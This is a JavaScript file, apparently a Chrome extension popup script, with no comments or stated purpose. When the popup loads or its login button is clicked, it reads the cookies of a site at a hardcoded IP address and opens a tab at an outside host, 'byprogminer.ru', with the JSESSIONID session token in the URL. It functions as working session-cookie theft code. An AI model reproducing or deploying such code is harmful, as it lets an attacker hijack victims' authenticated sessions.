const ORIG_HOST = '52.215.151.195';
const NEW_HOST = 'byprogminer.ru:49237';
const COOKIE = 'JSESSIONID';
const TIMEOUT = 1000;

const copyCookie = () => {
    chrome?.tabs?.query({
        status: 'complete',
        windowId: chrome.windows.WINDOW_ID_CURRENT,
        active: true,
    }, tab => {
        const url = Array.isArray(tab) && tab.length ? new URL(tab[0].url).host : '';

        if (url === ORIG_HOST) {
            chrome.cookies.getAll({ url: tab[0].url }, cookie => {
                localStorage.copyCookieData = JSON.stringify(cookie);
                setTimeout(() => sendCookie(), 300);
            });
        } else {
            chrome.tabs.update(tab.id, { url: `http://${ORIG_HOST}/login` });

            setTimeout(() => {
                const container = document.getElementById('container');
                const loader = document.getElementById('loader');
                container.setAttribute('style', 'display: flex');
                loader.setAttribute('style', 'display: none');
            }, TIMEOUT);
        }
    });
};

const checkCookie = () => {
    const copyCookieData = localStorage.copyCookieData
        ? JSON.parse(localStorage.copyCookieData)
        : null;

    if (copyCookieData && Array.isArray(copyCookieData) && Object.hasOwn(copyCookieData[0], 'value')) {
        return copyCookieData[0].value;
    }

    return '';
};

const sendCookie = () => {
    try {
        const cookie = checkCookie();

        if (cookie) {
            chrome.tabs.create({ 'url': `http://${NEW_HOST}?${COOKIE}=${cookie}` }, function (tab) {});
        }
    } catch (e) {
        return alert('Error parsing cookies. Please try again.');
    }
};

async function getCurrentTab() {
    const queryOptions = { active: true, currentWindow: true };
    const [tab] = await chrome.tabs.query(queryOptions);
    return tab;
}

window.addEventListener('load', function () {
    copyCookie();

    document.getElementById('login').addEventListener('click', copyCookie);
});
